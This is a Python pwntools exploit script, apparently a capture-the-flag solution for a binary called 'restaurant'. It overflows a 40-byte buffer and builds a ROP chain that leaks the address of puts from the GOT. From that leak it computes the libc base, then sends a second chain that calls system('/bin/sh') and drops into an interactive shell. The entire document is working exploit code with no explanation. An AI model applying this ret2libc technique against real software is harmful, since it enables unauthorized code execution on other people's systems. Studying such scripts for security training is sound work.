from pwn import *

import exploit_helper

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
exe = './restaurant'
libc = './libc.so.6'

# This will automatically get context arch, bits, os etc
target_elf = context.binary = ELF(exe, checksec=False)
libc_elf = ELF(libc, checksec=False)

return_offset = 40

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = exploit_helper.start(exe=exe, gdb_script=gdb_script)

io.sendlineafter(b'> ', b'1')

leak_rop = ROP([target_elf])

leak_rop.call(target_elf.plt['puts'], [next(target_elf.search(b''))])
leak_rop.call(target_elf.plt['puts'], [target_elf.got['puts']])
leak_rop.call((leak_rop.find_gadget(["ret"]))[0])
leak_rop.call(target_elf.symbols['fill'])

leak_payload = (b'A' * return_offset) + leak_rop.chain()
info(f'Leak ROP chain:\n{leak_rop.dump()}')

io.sendlineafter(b'> ', leak_payload)

io.recvuntil(b'\n')
io.recvuntil(b'\n')

raw_libc_puts_address = io.recvuntil(b'\n')[:-1]

libc_puts_address = int.from_bytes(raw_libc_puts_address, byteorder='little')
libc_elf.address = libc_puts_address - libc_elf.symbols['puts']
libc_system_address = libc_elf.symbols['system']
libc_bin_bash_address = next(libc_elf.search(b'/bin/sh\x00'))

success(f'LIBC puts address: {hex(libc_puts_address)}')
success(f'LIBC base address: {hex(libc_elf.address)}')
success(f'LIBC system address: {hex(libc_system_address)}')
success(f'LIBC \'/bin/bash\' address: {hex(libc_bin_bash_address)}')

exploit_rop = ROP([libc_elf])
exploit_rop.call(target_elf.plt['puts'], [next(target_elf.search(b''))])
exploit_rop.call(libc_elf.symbols['system'], [libc_bin_bash_address])
exploit_rop.call((exploit_rop.find_gadget(["ret"]))[0])
exploit_rop.call((exploit_rop.find_gadget(["ret"]))[0])

system_payload = (b'A' * return_offset) + exploit_rop.chain()
info(f'Exploit ROP chain:\n{exploit_rop.dump()}')

io.sendlineafter(b'> ', system_payload)
io.recvuntil(b'\n')
io.recvuntil(b'\n')

success('Your shell, my liege: ')
io.interactive()

